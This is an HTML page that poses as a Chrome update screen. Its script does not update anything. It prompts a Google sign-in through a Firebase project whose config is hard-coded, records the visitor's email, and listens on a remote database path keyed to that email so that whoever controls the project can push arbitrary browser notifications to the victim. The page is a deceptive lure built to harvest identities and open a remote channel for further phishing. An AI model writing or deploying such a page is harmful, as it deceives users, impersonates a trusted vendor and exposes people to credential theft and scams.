<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Updating Chrome</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    body { font-family: 'Roboto', sans-serif; background: #f1f3f4; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
    .box { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; }
    h1 { color: #1a73e8; }
    #status { margin-top: 1rem; color: #34a853; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Updating Chrome…</h1>
    <p>Do not close this window. Waiting for instructions…</p>
    <div id="status">Authenticating…</div>
  </div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
      authDomain: "notify-78da1.firebaseapp.com",
      databaseURL: "https://notify-78da1-default-rtdb.firebaseio.com",
      projectId: "notify-78da1",
      storageBucket: "notify-78da1.appspot.com",
      messagingSenderId: "936289141781",
      appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();
    const statusEl = document.getElementById("status");

    auth.signInWithPopup(new firebase.auth.GoogleAuthProvider())
      .then(result => {
        const email = result.user.email.replace(/\./g, "_"); // Firebase keys can't use "."
        statusEl.textContent = `Signed in as ${result.user.email}`;

        const ref = db.ref(`sessions/${email}`);
        ref.on("value", snapshot => {
          const data = snapshot.val();
          if (data && data.title && data.message) {
            if (Notification.permission !== "granted") {
              Notification.requestPermission();
            }
            new Notification(data.title, { body: data.message });
            ref.set({}); // clear after showing
          }
        });
      })
      .catch(error => {
        statusEl.textContent = "Auth failed.";
        console.error(error);
      });
  </script>
</body>
</html>
